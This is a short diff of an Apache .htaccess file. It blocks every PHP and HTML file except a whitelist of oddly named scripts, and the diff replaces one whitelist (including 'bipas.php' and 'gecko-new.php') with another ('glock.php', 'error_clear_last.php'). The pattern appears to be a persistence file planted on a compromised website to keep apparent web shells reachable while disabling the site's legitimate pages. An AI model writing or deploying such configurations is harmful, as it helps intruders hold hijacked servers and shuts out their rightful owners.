@@ -1,10 +1,9 @@
 <FilesMatch "\.(php|ph*|Ph*|PH*|pH*|shtml|phtml|htm*|PHTML|SHTML)$">
     Deny from all
 </FilesMatch>
-<FilesMatch "^(index.html|bipas.php|sehat.php|gecko-new.php|403.php)$">
+<FilesMatch "^(index.php|glock.php|error_clear_last.php|config.php|english.php)$">
     Allow from all
 </FilesMatch>
 <FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
     Allow from all
 </FilesMatch>
-
